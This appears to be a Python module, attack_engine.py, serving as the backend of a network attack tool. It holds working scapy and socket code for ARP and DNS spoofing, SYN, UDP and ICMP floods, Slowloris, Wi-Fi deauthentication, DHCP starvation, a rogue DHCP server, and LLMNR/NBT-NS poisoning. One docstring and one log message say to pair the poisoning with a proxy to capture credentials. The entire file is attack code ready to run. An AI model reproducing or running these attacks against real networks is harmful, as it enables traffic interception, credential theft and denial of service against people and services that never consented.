"""
attack_engine.py — backend thread functions for the Attack tab.

Each public function takes a threading.Event (stop_event) and a log_cb callable
that accepts a single string.  They are meant to be run in daemon threads.
"""

import os
import time
import random
import socket
import logging

logger = logging.getLogger(__name__)


# ── helpers ───────────────────────────────────────────────────────────────────

def _get_mac(ip):
    """ARP-resolve an IP to its MAC address.  Raises ValueError on failure."""
    from scapy.all import ARP, Ether, srp
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        timeout=3, verbose=False,
    )
    for _, rcv in ans:
        return rcv[Ether].src
    raise ValueError(f"Could not resolve MAC for {ip}")


# ── ARP Spoofing ──────────────────────────────────────────────────────────────

def arp_spoof(target_ip, gateway_ip, iface, stop_event, log_cb):
    """
    Poison target ↔ gateway ARP caches so traffic flows through this host.
    Restores original mappings on stop.
    Requires ip_forward to be enabled externally (p_firewall.filter does this).
    """
    from scapy.all import ARP, send

    try:
        log_cb("[ARP] Resolving MAC addresses…")
        target_mac  = _get_mac(target_ip)
        gateway_mac = _get_mac(gateway_ip)
        log_cb(f"[ARP] Target  {target_ip}  →  {target_mac}")
        log_cb(f"[ARP] Gateway {gateway_ip}  →  {gateway_mac}")
    except ValueError as e:
        log_cb(f"[ARP] Error: {e}")
        return

    # Pre-build poison packets (our MAC is the default src for send())
    poison_target  = ARP(op=2, pdst=target_ip,  hwdst=target_mac,  psrc=gateway_ip)
    poison_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)

    count = 0
    log_cb("[ARP] Poisoning started — press Stop to restore tables")
    try:
        while not stop_event.is_set():
            send(poison_target,  iface=iface, verbose=False)
            send(poison_gateway, iface=iface, verbose=False)
            count += 2
            if count % 20 == 0:
                log_cb(f"[ARP] {count} packets sent")
            stop_event.wait(2)
    finally:
        log_cb("[ARP] Restoring ARP tables…")
        try:
            restore_target = ARP(
                op=2, pdst=target_ip,  hwdst=target_mac,
                psrc=gateway_ip, hwsrc=gateway_mac,
            )
            restore_gateway = ARP(
                op=2, pdst=gateway_ip, hwdst=gateway_mac,
                psrc=target_ip, hwsrc=target_mac,
            )
            send(restore_target,  iface=iface, count=5, verbose=False)
            send(restore_gateway, iface=iface, count=5, verbose=False)
            log_cb("[ARP] ARP tables restored")
        except Exception as e:
            log_cb(f"[ARP] Restore error: {e}")


# ── DNS Spoofing ──────────────────────────────────────────────────────────────

def dns_spoof(iface, spoof_map, stop_event, log_cb):
    """
    Listen for DNS queries and reply with fake IPs.
    spoof_map: dict  {domain_substring: fake_ip}
    Requires this host to be in the traffic path (ARP spoof first).
    """
    from scapy.all import sniff, IP, UDP, DNS, DNSQR, DNSRR, send

    sent = [0]

    def _process(pkt):
        if stop_event.is_set():
            return
        if not (pkt.haslayer(DNS) and pkt[DNS].qr == 0 and pkt.haslayer(DNSQR)):
            return
        if not pkt.haslayer(IP):
            return
        qname = pkt[DNSQR].qname.decode("utf-8", errors="replace").rstrip(".")
        for pattern, fake_ip in spoof_map.items():
            if not pattern:
                continue
            if pattern == "*" or pattern in qname or qname == pattern:
                resp = (
                    IP(dst=pkt[IP].src, src=pkt[IP].dst) /
                    UDP(dport=pkt[UDP].sport, sport=53) /
                    DNS(
                        id=pkt[DNS].id, qr=1, aa=1, rd=1, ra=1,
                        qd=pkt[DNS].qd,
                        an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata=fake_ip),
                    )
                )
                send(resp, verbose=False)
                sent[0] += 1
                log_cb(f"[DNS] Spoofed {qname!r} → {fake_ip}  (total: {sent[0]})")
                break

    log_cb(f"[DNS] Listening on {iface or 'all interfaces'}")
    sniff(
        iface=None if iface in ("Any...", "") else iface,
        filter="udp port 53",
        prn=_process,
        store=False,
        stop_filter=lambda _: stop_event.is_set(),
    )
    log_cb(f"[DNS] Stopped — {sent[0]} queries spoofed")


# ── DoS: SYN flood ────────────────────────────────────────────────────────────

def syn_flood(target_ip, target_port, stop_event, log_cb):
    from scapy.all import IP, TCP, send, RandShort
    count = 0
    log_cb(f"[SYN] Flooding {target_ip}:{target_port}")
    while not stop_event.is_set():
        send(
            IP(dst=target_ip) / TCP(
                dport=int(target_port), sport=RandShort(),
                flags="S", seq=random.randint(0, 2**32 - 1), window=65535,
            ),
            verbose=False, count=64,
        )
        count += 64
        if count % 1024 == 0:
            log_cb(f"[SYN] {count} packets sent")
    log_cb(f"[SYN] Stopped — {count} total packets")


# ── DoS: UDP flood ────────────────────────────────────────────────────────────

def udp_flood(target_ip, target_port, stop_event, log_cb):
    from scapy.all import IP, UDP, Raw, send, RandShort
    count = 0
    log_cb(f"[UDP] Flooding {target_ip}:{target_port}")
    while not stop_event.is_set():
        send(
            IP(dst=target_ip) / UDP(dport=int(target_port), sport=RandShort()) /
            Raw(load=os.urandom(1024)),
            verbose=False, count=32,
        )
        count += 32
        if count % 1024 == 0:
            log_cb(f"[UDP] {count} packets sent")
    log_cb(f"[UDP] Stopped — {count} total packets")


# ── DoS: ICMP flood ───────────────────────────────────────────────────────────

def icmp_flood(target_ip, stop_event, log_cb):
    from scapy.all import IP, ICMP, Raw, send
    count = 0
    log_cb(f"[ICMP] Flooding {target_ip}")
    while not stop_event.is_set():
        send(
            IP(dst=target_ip) / ICMP() / Raw(load=os.urandom(56)),
            verbose=False, count=64,
        )
        count += 64
        if count % 1024 == 0:
            log_cb(f"[ICMP] {count} packets sent")
    log_cb(f"[ICMP] Stopped — {count} total packets")


# ── DoS: Slowloris ────────────────────────────────────────────────────────────

def slowloris(target_ip, target_port, num_sockets, stop_event, log_cb):
    """
    Hold as many half-open HTTP connections as possible.
    Works against servers that have a limited connection pool.
    """
    port = int(target_port)
    sockets = []

    def _open_socket():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        try:
            s.connect((target_ip, port))
            s.send(
                f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n"
                f"Host: {target_ip}\r\n"
                f"User-Agent: Mozilla/5.0\r\n"
                f"Accept-language: en-US,en;q=0.5\r\n".encode()
            )
            return s
        except Exception:
            try:
                s.close()
            except Exception:
                pass
            return None

    log_cb(f"[Slowloris] Opening {num_sockets} sockets to {target_ip}:{port}")
    for _ in range(num_sockets):
        if stop_event.is_set():
            break
        s = _open_socket()
        if s:
            sockets.append(s)
    log_cb(f"[Slowloris] {len(sockets)} sockets open")

    while not stop_event.is_set():
        alive = []
        for s in sockets:
            try:
                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                alive.append(s)
            except Exception:
                try:
                    s.close()
                except Exception:
                    pass
        sockets = alive
        while len(sockets) < num_sockets and not stop_event.is_set():
            s = _open_socket()
            if s:
                sockets.append(s)
        log_cb(f"[Slowloris] {len(sockets)} sockets alive")
        stop_event.wait(15)

    for s in sockets:
        try:
            s.close()
        except Exception:
            pass
    log_cb("[Slowloris] Stopped — all sockets closed")


# ── 802.11 Deauthentication ───────────────────────────────────────────────────

def deauth(iface, bssid, client, reason, stop_event, log_cb):
    """
    Send 802.11 Deauth frames to disconnect a client from an AP.
    client = "FF:FF:FF:FF:FF:FF"  →  broadcast deauth (kicks everyone).
    Requires the interface to be in monitor mode.
    """
    try:
        from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
        from scapy.all import sendp
    except ImportError:
        log_cb("[Deauth] scapy dot11 layers not available — install scapy[all]")
        return

    # Deauth from AP to client
    pkt_ap_to_client = (
        RadioTap() /
        Dot11(addr1=client, addr2=bssid, addr3=bssid) /
        Dot11Deauth(reason=reason)
    )
    # Deauth from client to AP (double-sided)
    pkt_client_to_ap = (
        RadioTap() /
        Dot11(addr1=bssid, addr2=client, addr3=bssid) /
        Dot11Deauth(reason=reason)
    )

    count = 0
    log_cb(f"[Deauth] Targeting client={client}  BSSID={bssid}  reason={reason}")
    while not stop_event.is_set():
        sendp(pkt_ap_to_client,  iface=iface, count=5, inter=0.05, verbose=False)
        sendp(pkt_client_to_ap,  iface=iface, count=5, inter=0.05, verbose=False)
        count += 10
        if count % 100 == 0:
            log_cb(f"[Deauth] {count} frames sent")
        stop_event.wait(0.1)
    log_cb(f"[Deauth] Stopped — {count} total frames")


# ── DHCP Starvation ───────────────────────────────────────────────────────────

def dhcp_starvation(iface, stop_event, log_cb):
    """
    Flood DHCP server with DISCOVER packets using random MAC addresses to
    exhaust the IP address pool.
    """
    from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, RandMAC

    count = 0
    log_cb(f"[DHCP Starvation] Flooding on {iface}")
    while not stop_event.is_set():
        fake_mac = RandMAC()
        mac_bytes = bytes(int(x, 16) for x in str(fake_mac).split(':'))
        pkt = (
            Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff") /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(chaddr=mac_bytes + b'\x00' * 10,
                  xid=random.randint(1, 2**32 - 1)) /
            DHCP(options=[("message-type", "discover"), "end"])
        )
        sendp(pkt, iface=iface, verbose=False)
        count += 1
        if count % 100 == 0:
            log_cb(f"[DHCP Starvation] {count} DISCOVER packets sent")
    log_cb(f"[DHCP Starvation] Stopped — {count} packets sent")


# ── Rogue DHCP Server ─────────────────────────────────────────────────────────

def rogue_dhcp(iface, server_ip, subnet_mask, router_ip, dns_ip,
               pool_start, pool_end, lease_time, stop_event, log_cb):
    """
    Act as a rogue DHCP server.  Responds to DISCOVER and REQUEST with our
    configured gateway/DNS, routing victims' traffic through this host.
    """
    import ipaddress
    from scapy.all import (Ether, IP, UDP, BOOTP, DHCP, sniff, sendp,
                           get_if_hwaddr)

    our_mac = get_if_hwaddr(iface)

    # Build IP pool
    try:
        start = ipaddress.IPv4Address(pool_start)
        end   = ipaddress.IPv4Address(pool_end)
        pool  = [str(ipaddress.IPv4Address(i))
                 for i in range(int(start), int(end) + 1)]
    except Exception as e:
        log_cb(f"[Rogue DHCP] Invalid IP range: {e}")
        return

    leases    = {}          # client_mac -> offered_ip
    pool_iter = iter(pool)

    def _next_ip(client_mac):
        if client_mac in leases:
            return leases[client_mac]
        try:
            ip = next(pool_iter)
            leases[client_mac] = ip
            return ip
        except StopIteration:
            return None

    def _build_response(msg_type, client_mac, offered_ip, xid, chaddr):
        return (
            Ether(src=our_mac, dst=client_mac) /
            IP(src=server_ip, dst="255.255.255.255") /
            UDP(sport=67, dport=68) /
            BOOTP(op=2, yiaddr=offered_ip, siaddr=server_ip,
                  chaddr=chaddr, xid=xid) /
            DHCP(options=[
                ("message-type", msg_type),
                ("subnet_mask", subnet_mask),
                ("router", router_ip),
                ("name_server", dns_ip),
                ("lease_time", int(lease_time)),
                ("server_id", server_ip),
                "end",
            ])
        )

    def _process(pkt):
        if not pkt.haslayer(DHCP) or not pkt.haslayer(BOOTP):
            return
        msg_type = next(
            (v for k, v in pkt[DHCP].options if k == "message-type"), None
        )
        client_mac = pkt[Ether].src
        xid        = pkt[BOOTP].xid
        chaddr     = pkt[BOOTP].chaddr

        if msg_type == 1:   # DISCOVER
            ip = _next_ip(client_mac)
            if not ip:
                log_cb("[Rogue DHCP] IP pool exhausted")
                return
            log_cb(f"[Rogue DHCP] OFFER {ip} → {client_mac}")
            sendp(_build_response("offer", client_mac, ip, xid, chaddr),
                  iface=iface, verbose=False)

        elif msg_type == 3:  # REQUEST
            ip = leases.get(client_mac)
            if not ip:
                ip = _next_ip(client_mac)
            if not ip:
                return
            log_cb(f"[Rogue DHCP] ACK   {ip} → {client_mac}  "
                   f"(GW={router_ip}, DNS={dns_ip})")
            sendp(_build_response("ack", client_mac, ip, xid, chaddr),
                  iface=iface, verbose=False)

        elif msg_type == 7:  # RELEASE
            leases.pop(client_mac, None)
            log_cb(f"[Rogue DHCP] RELEASE from {client_mac}")

    log_cb(f"[Rogue DHCP] Listening on {iface}")
    log_cb(f"[Rogue DHCP] Pool: {pool_start} – {pool_end}  |  "
           f"GW: {router_ip}  |  DNS: {dns_ip}")
    sniff(
        iface=iface,
        filter="udp and (port 67 or port 68)",
        prn=_process,
        store=False,
        stop_filter=lambda _: stop_event.is_set(),
    )
    log_cb(f"[Rogue DHCP] Stopped — {len(leases)} leases issued")


# ── LLMNR / NBT-NS Poisoning ──────────────────────────────────────────────────

def llmnr_nbtns_poison(our_ip, target_names, stop_event, log_cb):
    """
    Respond to LLMNR (UDP 5355) and NBT-NS (UDP 137) broadcast name queries
    with our IP.  When a Windows host can't resolve a name via DNS it falls
    back to these protocols — poisoning redirects the connection to us.

    target_names: list of substrings to match (empty list = respond to all).
    Combine with the TLS/TCP proxy to capture credentials from redirected
    connections.
    """
    import struct
    import threading

    def _matches(name):
        if not target_names:
            return True
        return any(t.lower() in name.lower() for t in target_names)

    # ── LLMNR (UDP 5355, multicast 224.0.0.252) ───────────────────────────
    def _llmnr():
        MCAST = "224.0.0.252"
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.settimeout(1.0)
            sock.bind(("", 5355))
            mreq = struct.pack("4s4s",
                               socket.inet_aton(MCAST),
                               socket.inet_aton("0.0.0.0"))
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
        except Exception as e:
            log_cb(f"[LLMNR] Setup error: {e}")
            return

        while not stop_event.is_set():
            try:
                data, addr = sock.recvfrom(512)
            except socket.timeout:
                continue
            except Exception:
                break

            if len(data) < 13:
                continue
            flags = struct.unpack(">H", data[2:4])[0]
            if flags & 0x8000:          # skip responses
                continue

            # Decode query name
            offset, parts = 12, []
            while offset < len(data):
                ln = data[offset]; offset += 1
                if ln == 0:
                    break
                parts.append(data[offset:offset + ln].decode("utf-8", errors="replace"))
                offset += ln
            qname = ".".join(parts)

            if not _matches(qname):
                continue
            log_cb(f"[LLMNR] '{qname}' from {addr[0]}  → poisoning with {our_ip}")

            # Build response
            name_enc = b"".join(bytes([len(p)]) + p.encode() for p in parts) + b"\x00"
            resp = (data[:2]                    # transaction ID
                    + b'\x80\x00'              # QR=1, no error
                    + b'\x00\x01'              # QDCOUNT=1
                    + b'\x00\x01'              # ANCOUNT=1
                    + b'\x00\x00\x00\x00'      # NSCOUNT, ARCOUNT
                    + name_enc                  # question name
                    + b'\x00\x01\x00\x01'      # type A, class IN
                    + name_enc                  # answer name
                    + b'\x00\x01\x00\x01'      # type A, class IN
                    + b'\x00\x00\x00\x1e'      # TTL 30s
                    + b'\x00\x04'              # RDLENGTH 4
                    + socket.inet_aton(our_ip))
            try:
                sock.sendto(resp, addr)
            except Exception:
                pass
        sock.close()

    # ── NBT-NS (UDP 137) ──────────────────────────────────────────────────
    def _nbtns():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.settimeout(1.0)
            sock.bind(("", 137))
        except Exception as e:
            log_cb(f"[NBT-NS] Bind error: {e}  (needs root)")
            return

        while not stop_event.is_set():
            try:
                data, addr = sock.recvfrom(512)
            except socket.timeout:
                continue
            except Exception:
                break

            if len(data) < 12:
                continue
            flags = struct.unpack(">H", data[2:4])[0]
            if flags & 0x8000:          # skip responses
                continue

            # Decode first-level encoded NetBIOS name (offset 13, 32 bytes)
            try:
                raw = data[13:13 + 32]
                qname = "".join(
                    chr(((raw[i] - 0x41) << 4) | (raw[i + 1] - 0x41))
                    for i in range(0, 30, 2)
                ).rstrip("\x00 ")
            except Exception:
                qname = "?"

            if not _matches(qname):
                continue
            log_cb(f"[NBT-NS] '{qname}' from {addr[0]}  → poisoning with {our_ip}")

            # Build NBT-NS response (positive name query response)
            resp = (data[:2]
                    + b'\x85\x00'          # response, authoritative
                    + b'\x00\x00'          # QDCOUNT 0
                    + b'\x00\x01'          # ANCOUNT 1
                    + b'\x00\x00\x00\x00'  # NSCOUNT, ARCOUNT
                    + data[12:46]          # repeat name section from query
                    + b'\x00\x20'          # type NB
                    + b'\x00\x01'          # class IN
                    + b'\x00\x00\x04\xb0'  # TTL 1200s
                    + b'\x00\x06'          # RDLENGTH 6
                    + b'\x00\x00'          # NB flags (B-node, unique)
                    + socket.inet_aton(our_ip))
            try:
                sock.sendto(resp, addr)
            except Exception:
                pass
        sock.close()

    t_llmnr = threading.Thread(target=_llmnr, daemon=True)
    t_nbtns  = threading.Thread(target=_nbtns,  daemon=True)
    t_llmnr.start()
    t_nbtns.start()

    log_cb(f"[Poison] LLMNR (UDP 5355) + NBT-NS (UDP 137) active")
    log_cb(f"[Poison] Responding with: {our_ip}")
    if target_names:
        log_cb(f"[Poison] Filtering names: {', '.join(target_names)}")
    else:
        log_cb("[Poison] Responding to ALL queries")
    log_cb("[Poison] Tip: start TCP/TLS Proxy to capture redirected auth attempts")

    stop_event.wait()
    t_llmnr.join(timeout=2)
    t_nbtns.join(timeout=2)
    log_cb("[Poison] Stopped")
